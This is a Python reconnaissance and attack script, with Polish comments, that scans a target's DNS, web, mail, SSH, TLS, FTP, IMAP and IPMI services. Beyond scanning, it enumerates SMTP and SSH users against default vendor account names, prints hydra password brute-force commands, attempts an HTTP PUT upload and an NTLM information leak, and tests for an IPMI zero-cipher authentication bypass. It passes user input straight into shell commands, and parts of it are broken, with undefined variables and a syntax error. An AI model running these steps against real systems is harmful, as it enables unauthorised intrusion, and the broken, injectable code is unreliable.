import telnetlib
import sys
import subprocess
import nmap
import socket

def CVE_DNS_53():
	nms = nmap.PortScanner()
	srv = input("Give a dns site[ns2.isc-sns.com]: ")
	argsv = "-Pn -sU -A -n -p53 "
	print("Signature testing and NSID querying ...")
	nms.scan(srv, arguments=argsv)

	data = socket.gethostbyname(srv)
	print("\t\tResult: ")
	print("\t\t\tService: "+nm[data]['udp'][53]['name'])
	print("\t\t\tState: "+nm[data]['udp'][53]['state'])
	print("\t\t\tReason: "+nm[data]['udp'][53]['reason'])
	print("\t\t\tProduct: "+nm[data]['udp'][53]['product'])
	print("\t\t\tVersion: "+nm[data]['udp'][53]['version'])
	print("\t\t\tMore Info: "+nm[data]['udp'][53]['extrainfo'])

	try:
		print("\t\t\t\tdns-nsid:")
		print("\t\t\t\t\t"+nm[ip]['udp'][53]['script']['dns-nsid'])
	except:
		print("")


	print("\nTesting configuration of DNS recursion ...")
	argsv = "-Pn -sSUV -p53 --script dns-recursion,dns-random-srcport,dns-random-txid"
	nms.scan(srv, arguments=argsv)
	print("\t\t\tService: "+nm[data]['udp'][53]['name'])
	print("\t\t\tState: "+nm[data]['udp'][53]['state'])
	print("\t\t\tReason: "+nm[data]['udp'][53]['reason'])
	print("\t\t\tProduct: "+nm[data]['udp'][53]['product'])
	print("\t\t\tVersion: "+nm[data]['udp'][53]['version'])
	print("\t\t\tMore Info: "+nm[data]['udp'][53]['extrainfo'])

	print("""
	Vulnerabilities for ISC BIND 9
				CVE-2016-1285
				CVE-2016-1284
				CVE-2015-8461
				CVE-2015-5986
				CVE-2015-5722
				CVE-2015-4620
				CVE-2015-5477
				CVE-2014-8500
				CVE-2014-3859
				CVE-2014-3214
				CVE-2014-0591
				CVE-2013-4854
				CVE-2013-3919
				CVE-2013-2266
				CVE-2012-5689
				CVE-2012-5688
				CVE-2012-5166
				CVE-2012-4244
				CVE-2012-3868
				CVE-2012-3817
				CVE-2012-1667
				CVE-2011-4313
				CVE-2011-2465
				CVE-2011-2464
				CVE-2011-1910
				CVE-2011-1907

	Vulnerabilities for Microsoft DNS:
				CVE-2016-3227
				CVE-2015-6125
				CVE-2012-0006
				CVE-2012-1194
				CVE-2012-1194
				CVE-2011-1970
				CVE-2011-1966
				CVE-2009-0234
	""")

def CVE_Web_Servers(ip):
	#identyfikowanie obecności proxy lub równoważenia obciążeń
	print("Identifying the presence of proxy or load balancing: ")
	host = ip
	port = "80"
	telnetObj=telnetlib.Telnet(host, port)
	message = ("HEAD / HTTP/1.1\nHost:"+host+"\n\n").encode('ascii')
	telnetObj.write(message)
	output=telnetObj.read_all()
	print(output)
	telnetObj.close()

	#przeczesywanie nazw hostów wirtualnych
	###############################################################################
	print("\n\nRunning http-vhosts script ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='--script http-vhosts -p80,8080,443')
	print("\t\tResult: ")
	print("\t\t\tService: "+nm[ip]['tcp'][80]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][80]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][80]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][80]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][80]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][80]['extrainfo'])

	try:
		print("\t\t\t\thttp-vhosts:")
		print("\t\t\t\t\t"+nm[ip]['tcp'][80]['script']['http-vhosts'])
	except:
		print("")
	#############################################################################
	print("\t\tService: "+nm[ip]['tcp'][443]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][443]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][443]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][443]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][443]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][443]['extrainfo'])

	try:
		print("\t\t\t\thttp-vhosts:")
		print("\t\t\t\t\t"+nm[ip]['tcp'][443]['script']['http-vhosts'])
	except:
		print("")
	############################################################################
	print("\t\tService: "+nm[ip]['tcp'][8080]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][8080]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][8080]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][8080]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][8080]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][8080]['extrainfo'])

	try:
		print("\t\t\t\thttp-vhosts:")
		print("\t\t\t\t\t"+nm[ip]['tcp'][8080]['script']['http-vhosts'])
	except:
		print("")


	#wysyłanie żądania OPTIONS
	print("\n\nSending OPTIONS Request: ")
	telnetObj=telnetlib.Telnet(host, port)
	message = ("OPTIONS / HTTP/1.1\nHost:"+host+"\n\n").encode('ascii')
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#uzyskiwanie użytecznych informacji z nagłówków HTTP
	print("\n\nGetting useful information from HTTP headers: ")
	telnetObj=telnetlib.Telnet(host, port)
	message = ("HEAD / HTTP/1.0\n\n").encode('ascii')
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#cookie ustawiane
	print("\n\nCookie set: ")
	message = ("HEAD / HTTP/1.1\nHost:"+host+"\n\n").encode('ascii')
	telnetObj=telnetlib.Telnet(host, port)
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#identyfikowanie serwera aplikacji Resin 4
	print("\n\nIdentifying the Resin 4 application server: ")
	message = ("GET / HTTP/1.0\n\n").encode('ascii')
	telnetObj=telnetlib.Telnet(host, port)
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#wykrywanie zapór aplikacji web
	print("\n\nDetection firewalls of web application: ")
	print("Use this command: wafw00f http://www.paypal.com")

	#tworzenie odcisku palca serwera web
	print("\n\nCreating Fingerprint of Web Server:")
	print("Use this command: whatweb -a=4 http://www.microsoft.com")

	#nikto
	print("\n\nChecking website with nikto:")
	print("Use this command: nikto -h www.apache.org")

	#szczegóły nazw userów i katalogów ujawnione za pośrednictwem /.svn/
	print("\n\nDetails of usernames and directory names disclosed through /.svn/:")
	print("Use those commands:\nwget http://.example.org/.svn/entries\nstrings entries | head -24")

	#pliki dzienników aplikacji mogą zawierać tokeny i poświadczenia
	print("\n\nApplication log files can contain tokens and credentials: ")
	print("Use those commands:\nwget https://jira.codehaus.org/secure/attachment/24206/client.log\nhead -15 client.log")

	#wymagane uwierzytelnienie dla dostępu do pliku author.dll
	print("\n\nRequired Authentication for access to the author.dll file: ")
	message = ("HEAD /_vti_bin/_vti_aut_/author.dll HTTP/1.1\nHost:"+host+"\n\n").encode('ascii')
	telnetObj=telnetlib.Telnet(host, port)
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#siłowe łamanie haseł przy wykorzystaniu uwierzytelnienia Basic dla pliku author.dll
	print("\n\nBrute force using Basic authentication for author.dll file:")
	print("You need to have hydra tool")
	print("Use this command:\nhydra -L namelist.txt -P burnett_top_500.txt www.example.org http-head /_vti_bin/_vti_aut/author.dll")

	#http put:
	print("\n\nWarning!!! Prepare test.txt file before continuing. And then press any button...")
	input()
	print("HTTP PUT: ")
	message = ("PUT /scripts/test.txt HTTP/1.1\nHost:"+host+"\n\n").encode('ascii')
	#message = ("PUT /test.txt HTTP/1.1\nHost:"+host+"\n\n")
	telnetObj=telnetlib.Telnet(host, port)
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	#uruhcamianie davtest
	print("\n\nRunning davtest tool by: davtest -url http://ip")

	#wywoływanie wycieku informacji z mechanizmu uwierzytelniania windows
	print("\n\nCalling a leak information from the windows authentication mechanism: ")
	message = ("GET / HTTP/1.1\nHost:"+host+"\nAuthorization: Negotiate TlRMTVNTUAABAAAAB4IAoAAAAAAAAAAAAAAAAAAAAAAAAA\n\n").encode('ascii')
	telnetObj=telnetlib.Telnet(host, port)
	telnetObj.write(message)
	output = telnetObj.read_all()
	print(output)
	telnetObj.close()

	print("""
	Known Vulnerabilities of Microsoft IIS:
			CVE-2015-1635
			CVE-2014-4078
			CVE-2010-2730
			CVE-2010-1256
			CVE-2009-4444
			CVE-2009-2509
			CVE-2009-1535
			CVE-2009-1122

	Known Vulnerabilities of Apache HTTP Server:
			CVE-2012-0053
			CVE-2014-6278
			CVE-2014-0226
			CVE-2013-5697
			CVE-2013-4365
			CVE-2013-2249
			CVE-2013-1862
			CVE-2012-4528
			CVE-2012-4001
			CVE-2011-4317
			CVE-2011-3368
			CVE-2011-2688
			CVE-2010-3872
			CVE-2010-1151
			CVE-2010-0425
			CVE-2010-0010
			CVE-2009-3095

	Known Vulnerabilities of Apache Coyote:
			CVE-2011-1419
			CVE-2011-1183
			CVE-2011-1088
			CVE-2010-2227

	Known Vulnerabilities of nginx:
			CVE-2014-0088
			CVE-2013-4547
			CVE-2013-2028
			CVE-2011-4963
			CVE-2012-1180
	""")

def CVE_Platforms_Store_Web_Data(ip):
	#rozpoznawanie platformy drupal
	print('''List of apps to choose:
		 - admin_menu
		 - cck
		 - date
		 - filefield
		 - google_analytics
		 - imageapi
		 - imagecache
		 - imagefield
		 - imce
		 - imce_swfupload
		 - pathauto
		 - print
		 - spamicide
		 - tagadelic
		 - token
		 - views
		joomla with 0 plugins
		liferay with 0 plugins
		mediawiki with 0 plugins
		moodle with 0 plugins
		movabletype with 0 plugins
		oscommerce with 0 plugins
		phpbb with 0 plugins
		phpmyadmin with 0 plugins
		phpnuke with 0 plugins
		spip with 0 plugins
		tikiwiki with 0 plugins
		twiki with 0 plugins
		wordpress with 26 plugins
		 - add-to-any
		 - advertising-manager
		 - akismet
		 - all-in-one-seo-pack
		 - buddypress
		 - contact-form-7
		 - gd-star-rating
		 - google-analyticator
		 - google-sitemap-generator
		 - newsletter
		 - nextgen-gallery
		 - polldaddy
		 - simple-tags
		 - smart-youtube
		 - sociable
		 - stats
		 - subscribe2
		 - tinymce-advanced
		 - twitter-tools
		 - wp-e-commerce
		 - wp-pagenavi
		 - wp-spamfree
		 - wp-super-cache
		 - wp-useronline
		 - wptouch
		 - yet-another-related-posts-plugin
	''')
	appname = input("Enter appName: ")
	print("Running BlindElephant script in new window... ")
	com = 'xterm -hold -e \'./BlindElephant.py '+ip+' '+appname+'\'&'
	subprocess.call(com, shell=True)

def CVE_SMTP_25(ip):
	#rozpoznawanie pkt końcowego ręczne
	inp = input("Enter the sever that you want to search for the smtp endpoint[example: fb.com]:")
	com = "xterm -hold -e \'dig +short mx "+inp+'\'&'
	print("dig command opened in new window ...")
	subprocess.call(com, shell=True)
	inp2 = input("Give a smtp server[example: mxa-0000.gslb.pphosted.com]:")
	print("Endpoint recognition: ")
	host = socket.gethostbyname(inp2)
	port = "25"
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("HELP\nQUIT\n\\n").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")

	print("Endpoint recognition with nmap: ")
	nm = nmap.PortScanner()
	nm.scan(host, arguments='-P0 -n -sV -p25')
	print("\t\tService: "+nm[host]['tcp'][25]['name'])
	print("\t\t\tState: "+nm[host]['tcp'][25]['state'])
	print("\t\t\tReason: "+nm[host]['tcp'][25]['reason'])
	print("\t\t\tProduct: "+nm[host]['tcp'][25]['product'])
	print("\t\t\tVersion: "+nm[host]['tcp'][25]['version'])
	print("\t\t\tMore Info: "+nm[host]['tcp'][25]['extrainfo'])

	#skierowanie wiadomości email do określonych interfejsów SMTP
	print("Referral of e-mails to specific SMTP interfaces ...")
	#dig +short mx nintendo.com
	com2 = 'xterm -hold -e \'dig +short mx '+inp2+'\'&'
	print("dig command opened in new window ...")
	subprocess.call(com2, shell=True)
	#swaks -n -hr -f chris@example.org -t blalblalb@nintentdo.com -s smtpgw1.nintendo.com:25
	print("swaks command running ...")
	print("Example of use: ")
	print("swaks -n -hr -f chris@example.org -t blablabla@nintendo.com -s smtpgw1.nintendo.com:25")
	exampuser=input("Enter example user:")
	srvv = input("Enter server of target host: ")
	srvmx=input("Enter mx server: ")
	com3 = 'xterm -hold -e \'swaks -n -hr -f '+exampuser+' -t '+srvv+' -s '+srvmx+':25 | EHLO localhost\nMAIL FROM:'+exampuser+'\nRCPT TO:'+srvv+'\nDATA\n\n\n\n\n\n\n\n\nQUIT\'&'
	print("Run in new window ...")
	subprocess.call(com3, shell=True)

	#wyliczanie obsługiwanych poleceń SMTP:
	print("Enumeration of supported SMTP commands ...")
	#telnet microsoft-com.mai.protection.outlook.com 25
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("HELP\nEHLO world\nQUIT\n\n").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")
	#nmap -P0 -p25 --script smtp-commands <ip>
	print("Enumeration of supported SMTP commands with nmap ...")
	nm.scan(host, arguments='-P0 -p25 --script smtp-commands')
	print("\t\tService: "+nm[host]['tcp'][25]['name'])
	print("\t\t\tState: "+nm[host]['tcp'][25]['state'])
	print("\t\t\tReason: "+nm[host]['tcp'][25]['reason'])
	print("\t\t\tProduct: "+nm[host]['tcp'][25]['product'])
	print("\t\t\tVersion: "+nm[host]['tcp'][25]['version'])
	print("\t\t\tMore Info: "+nm[host]['tcp'][25]['extrainfo'])

	#wykorzystanie expn do wyliczenia lokalnych serwerów
	print("Using EXPN to enumerating local servers ...")
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("HELLO world\nEXPN test\nEXPN root\nEXPN sshd\n\n").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")

	#użycie VRFY do wyliczenia lokalnych userów
	print("Using VRFY to enumerating local users ...")
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("HELLO world\nVRFY test\nVRFY chris\n\n").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")

	#użycie RCPT TO do wyliczenia lokalnych userów
	print("Using TCPT TO to enumerate local users ...")
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("HELLO world\nMAIL FROM:test@test.org\nRCPT TO:test\nRCPT TO:admin\nRCPT TO:chris\n\n").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")

	#wyliczanie metod uwierzytelniania przy użyciu EHLO
	print("Enumaration of authentication methods using EHLO ...")
	try:
		telnetObj=telnetlib.Telnet(host, port)
		message = ("EHLO").encode('ascii')
		telnetObj.write(message)
		output=telnetObj.read_all()
		print(output)
		telnetObj.close()
	except:
		print("Network is unreachable")

	#siłowe łamanie haseł SMTP przy użyciu narzędzia Hydra
	print("Brute-force method to break SMTP passwords")
	print("Use this command: ")
	print("hydra -L users.txt -P crackdict.txt smtp://mail.example.org/CRAM-MD5")

	#przegląd konfiguracji SPF
	print("Review of the SPF configuration ...")
	dd = input("Enter website to check: ")
	print("Open in new window ...")
	comss = 'xterm -hold -e \'dig '+dd+' txt | grep spf\'&'
	subprocess.call(comss, shell=True)

	#odczytanie publicznego klucza DKIM
	print("Reading the public key - DKIM: ")
	ss = input("Enter domainkey - example[20120113._domainkey.gmail.com]: ")
	print("Running in new window ...")
	comsr = 'xterm -hold -e \'dig '+ss+' TXT | grep p=\'&'
	subprocess.call(comsr, shell=True)

	#odbieranie zasad DMARC
	print("Receiving DMARC rules ...")
	dmarc = input("Enter dmarc domain to take a rules - example[_dmarc.google.com]: ")
	print("Running in new window ...")
	comsd = 'xterm -hold -e \'dig '+dmarc+' txt | grep DMARC\'&'
	subprocess.call(comsd, shell=True)

	print("""
		Vulnerabilities of AV:
				CVE-2016-2208 Symantec
				CVE-2010-4479 ClamAV
				CVE-2010-4260 ClamAV
				CVE-2010-4261 ClamAV

		Vulnerabilities of Exim Server:
				CVE-2014-2957
				CVE-2012-5671
				CVE-2011-1764
				CVE-2011-1407
				CVE-2010-4344

		Vulnerabilities of Postfix:
				CVE-2011-1720

		Vulnerabilities of Sendmail:
				CVE-2009-4565
				CVE-2009-1490

		Vulnerabilities of Exchange SMTP:
				CVE-2014-0294
				CVE-2010-0025
				CVE-2009-0098

		Vulnerabiltities of IBM Domino SMTP:
				CVE-2011-0916
				CVE-2011-0915
				CVE-2010-3407
	""")

def CVE_SSH_22(ip):
	#odebranie baneru SSH
	nm = nmap.PortScanner()
	print("Taking banner of SSH ...")
	nm.scan(ip, arguments='-sV --script=banner')
	print("\t\tService: "+nm[ip]['tcp'][22]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][22]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][22]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][22]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][22]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][22]['extrainfo'])


	#odczytywanie publicznych kluczy DSA i RSA
	print("Reading DSA and RSA public keys ...")
	nm.scan(ip, arguments='-Pn -n -p22 -A')
	print("\t\tService: "+nm[ip]['tcp'][22]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][22]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][22]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][22]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][22]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][22]['extrainfo'])

	#wyliczanie algorytmów obsługiwanych przez serwer
	print("Calculating algorithms using by server ...")
	nm.scan(ip, arguments='-Pn -n -p22 --script ssh2-enum-algos')
	print("\t\tService: "+nm[ip]['tcp'][22]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][22]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][22]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][22]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][22]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][22]['extrainfo'])

	#wyliczanie obsługiwanych mechanizmów uwierzytelniania
	print("Calculation of supported authentication mechanisms")
	fuzz_ssh(ip)

	#wyliczanie poprawnych kluczy
	print("It will testing public keys like \'ssh_identify_pubkeys\', so prepare f5.pub file before and click any button ...")
	input()
	#testowanie poprawności publicznych kluczy
	#standardowo root jeśli user nie poda użytkownika
	user = input("Give a name[mainly setting: root]:")
	print("Result will be show in new window ...")
	if user is None:
		#root
		com = "xterm -hold -e \'ssh -i f5.pub root@"+ip+'\'&'
		subprocess.call(com, shell=True)
	else:
		#user
		com = "xterm -hold -e \'ssh -i f5.pub "+user+"@"+ip+'\'&'
		subprocess.call(com, shell=True)

	print("""Known Vulnerabilities of SSH:
		CVE-2015-5600
		CVE-2013-3594
		CVE-2013-4652
		CVE-2013-4434
		CVE-2013-0714
		CVE-2012-6067
		CVE-2012-5975
	""")

def fuzz_ssh(ip):
	print("Welcome to user_fuzz of SSH")
	users = ['admin', 'cisco', 'enable', 'hsa', 'pnadmin', 'ripeop', 'root', 'shelladmin',
	'nsroot', 'nsmaint', 'vdiadmin', 'kvm', 'cli', 'user', 'user1', 'vkernel.cli']
	#passwords = ['admin123', 'password', 'brocade', 'fibranne', 'Admin123', 'default',
	#'secur4u', 'cisco', 'Cisco', '_Cisco', 'cisco123', 'C1sco!123', 'Cisco123', 'TANDBERG',
	#'change_it', '12345', 'ipics', 'pnadmin', 'diamond', 'hsadb', 'c', 'cc', 'attack', 'blender',
	#'changeme', C1trix321', 'nsroot', 'nsmaint', 'kaviza', 'kaviza123', 'freebsd', 'public',
	#'rootadmin', wanscaler', 'private', 'admin', 'user']
	nm = nmap.PortScanner()

	for i in users:
		print("ssh -v user@ip:")
		wt = "ssh checking for: " + i
		print(wt)
		nm.scan(ip, arguments="-p 22 --script ssh-auth-methods --script-args=\"ssh.user\"="+i)
		print("\t\tService: "+nm[ip]['tcp'][22]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][22]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][22]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][22]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][22]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][22]['extrainfo'])
		try:
			print("\t\t\t\tssh-auth-methods:")
			print("\t\t\t\t\t"+nm[ip]['tcp'][22]['script']['ssh-auth-methods'])
		except:
			print("")


def CVE_TLS_25_443_110(ip, port):
	#wyliczanie pakietów kryptograficznych obsługiwanych w OpenSSL
	print("Enumeration of cryptographic packages supported in OpenSSL in new window:")
	com1 = "xterm -hold -e \'openssl ciphers -v\'&"
	subprocess.call(com1, shell=True)

	#wydobywanie pół X.509 z certyfikatu
	print("Extracting half of X.509 from the certificate in new window:")
	com2 = "xterm -hold -e \'openssl x509 -text -noout\'&"
	subprocess.call(com2, shell=True)

	nm = nmap.PortScanner()
	#odczytywanie certyfikatu X.509:
	if 443 in port:
		print("Reading the X.509 certificate:")
		srv = input("Enter website you want to check: ")
		print("Result in new window ...")
		com3 = "xterm -hold -e \'openssl s_client -connect " + srv + ":443\'&"
		subprocess.call(com3, shell=True)

		#korzystanie ze skryptu ssl-enum-ciphers##################################################################
		print("Running ssl-enum-ciphers script:")
		nm.scan(ip, arguments='--script ssl-enum-ciphers -p443')
		print("\t\tService: "+nm[ip]['tcp'][443]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][443]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][443]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][443]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][443]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][443]['extrainfo'])


		#testowanie obsługi wznawiania sesji TLS
		print("Testing support for resuming TLS sessions in new window ...")
		com4 = "xterm -hold -e \'sslyze --resum "+srv+":443\'&"
		subprocess.call(com4, shell=True)

		#testowanie renegocjowania TLS
		print("Testing TLS renegotiation in new window ...")
		com5 = "xterm -hold -e \'sslyze --reneg "+srv+":443\'&"
		subprocess.call(com5, shell=True)

		#wyliczanie obsługiwanych rozszerzeń TLS
		print("Enumaration of supported TLS extensions in new window ...")
		com6 = "xterm -hold -e \'openssl s_client -tlsextdebug -connect " + srv +":443\'&"
		subprocess.call(com6, shell=True)

		#testowanie obsługi kompresji TLS oraz SPDY
		print("Testing of TLS nad SPDY compression support in new window ...")
		com7 = "xterm -hold -e \'sslyze --compression "+srv+":443\'&"
		subprocess.call(com7, shell=True)

		#testowanie obsługi trybu obniżania sesji TLS
		print("Testing of TLS session lowering mode support in new window ...")
		com8 = "xterm -hold -e \'openssl s_client -connect "+srv+":443 -no_tls1_2 -fallback_scsv\'&"
		subprocess.call(com8, shell=True)

		#podstawowe odpytywanie TLS##################################################################################
		print("Basic requesting of TLS:")
		nm.scan(ip, arguments='--script ssl-cert -p443')
		print("\t\tService: "+nm[ip]['tcp'][443]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][443]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][443]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][443]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][443]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][443]['extrainfo'])

		#identyfikowanie punktów końcowych o znanych kluczach#####################################################
		print("Identifying endpoints with known keys:")
		nm.scan(ip, arguments='--script ssl-known-key -p443')
		print("\t\tService: "+nm[ip]['tcp'][443]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][443]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][443]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][443]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][443]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][443]['extrainfo'])

	elif 25 in port:
		print("STARTTLS check ...")
		print("Initiating TLS sessions in SMTP:")
		#telnet mail.imc.org 25
		host = ip
		port = "25"
		telnetObj=telnetlib.Telnet(host, port)
		message = ("EHLO world\nSTARTTLS").encode('ascii')
		telnetObj.write(message)
		output = telnetObj.read_all()
		print(output)
		telnetObj.close()


		#testowanie renegocjowania TLS
		print("Testing TLS renegotiation in new window ...")
		srvsmtp = input("Enter SMTP Server[example: aspmx.l.google.com]: ")
		com = "xterm -hold -e \'sslyze --reneg --starttls=smtp "+srvsmtp+":25\'&"
		subprocess.call(com, shell=True)
	elif 110 in port:
		#negocjowanie sesji poprzez dyrektywę STARTTLS:
		print("Negotiating sessions through the STARTTLS directive in new window ...")
		srvmail = input("Enter Mail Server[example: mail.example.org]: ")
		com = "xterm -hold -e \'openssl s_client -starttls pop3 -connect "+srvmail+":110\'&"
		subprocess.call(com, shell=True)

	print("""
		Known Vulns of SSL and TLS:
			CVE-2016-0800
			CVE-2015-4000
			CVE-2014-3566
			CVE-2011-3389
			CVE-2012-4929
			CVE-2013-3587
			CVE-2013-2566
			CVE-2009-3555
			CVE-2016-2108
			CVE-2016-2107
			CVE-2016-0703
			CVE-2016-0702
			CVE-2016-0701
			CVE-2015-7575
			CVE-2015-0204
			CVE-2015-1067
			CVE-2015-1637
			CVE-2014-3512
			CVE-2014-3511
			CVE-2014-3466
			CVE-2014-0160
			CVE-2013-0169
			CVE-2011-4108
	""")

def CVE_548_AppleFilingProtocol(ip):
	#nmap -sSVC -p548 <ip>
	print("Checking Apple Filing Protocol ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-sSVC -p548')

	print("\t\tService: "+nm[ip]['tcp'][548]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][548]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][548]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][548]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][548]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][548]['extrainfo'])

	print("""
		CVE-2014-4426
		CVE-2010-1830
		CVE-2010-1829
		CVE-2010-1820
		CVE-2010-0533
		CVE-2010-0057
	""")

def CVE_21_FTP(ip):
	#Recognition
	print("Recognition of FTP ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-Pn -sS -A -p21')

	print("\t\tService: "+nm[ip]['tcp'][21]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][21]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][21]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][21]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][21]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][21]['extrainfo'])

	print("""
		Vulns of Microsoft IIS FTP Server:
			CVE-2010-3972 stack overflow
			CVE-2009-3023 NLIST register overflow

		Vulns of ProFTPD:
			CVE-2015-3306
			CVE-2014-6271
			CVE-2011-4130
			CVE-2010-4652
			CVE-2010-4221
			CVE-2010-3867
			CVE-2009-0919
			CVE-2009-0542
			CVE-2009-0543

		Vulns of PureFTPd:
			CVE-2011-1575
			CVE-2011-0988
			CVE-2011-3171
	""")

def CVE_143_993_IMAP(ip,port):
	print("Recognition of IMAP ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-sV -p143,993 --script imap-capabilities')

	if 143 in port:
		print("\t\tService: "+nm[ip]['tcp'][143]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][143]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][143]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][143]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][143]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][143]['extrainfo'])

		try:
			print("\t\t\tIMAP Capabilities: "+nm[ip]['tcp'][143]['script']['imap-capabilities']
		except:
			print("There\'s no more information")
	elif 993 in port:
		print("\t\tService: "+nm[ip]['tcp'][993]['name'])
		print("\t\t\tState: "+nm[ip]['tcp'][993]['state'])
		print("\t\t\tReason: "+nm[ip]['tcp'][993]['reason'])
		print("\t\t\tProduct: "+nm[ip]['tcp'][993]['product'])
		print("\t\t\tVersion: "+nm[ip]['tcp'][993]['version'])
		print("\t\t\tMore Info: "+nm[ip]['tcp'][993]['extrainfo'])

		try:
			print("\t\t\tIMAP Capabilities: "+nm[ip]['tcp'][993]['script']['imap-capabilities'])
		except:
			print("There\'s no more information")

	print("\t\tTo break password use this command: hydra imap -U")

	print("""Vulns of IMAP:
		CVE-2011-0919
		CVE-2010-4717
		CVE-2010-4711
		CVE-2010-2777
	""")

def CVE_IPMI(ip):
	#PORT 623 UDP
	#version scanning of IPMI
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-sU --script ipmi-version -p 623')

	print("\t\tService: "+nm[ip]['udp'][623]['name'])
	print("\t\t\tState: "+nm[ip]['udp'][623]['state'])
	print("\t\t\tReason: "+nm[ip]['udp'][623]['reason'])
	print("\t\t\tProduct: "+nm[ip]['udp'][623]['product'])
	print("\t\t\tVersion: "+nm[ip]['udp'][623]['version'])
	print("\t\t\tMore Info: "+nm[ip]['udp'][623]['extrainfo'])

	try:
		print("\t\t\tIPMI version: "+nm[ip]['udp'][623]['script']['ipmi-version'])
	except:
		print("There\'s no more information ...")

	#zrzucanie skrótów haseł
	#impi_dumphashes

	#testowanie możliwości wykonania ominięcia uwierzytelniania IPMI zero cipher
	print("\t\t\tTesting Zero Cipher attack ...")
	nm.scan(ip, arguments='-sU --script ipmi-cipher-zero -p 623')

	print("\t\tService: "+nm[ip]['udp'][623]['name'])
	print("\t\t\tState: "+nm[ip]['udp'][623]['state'])
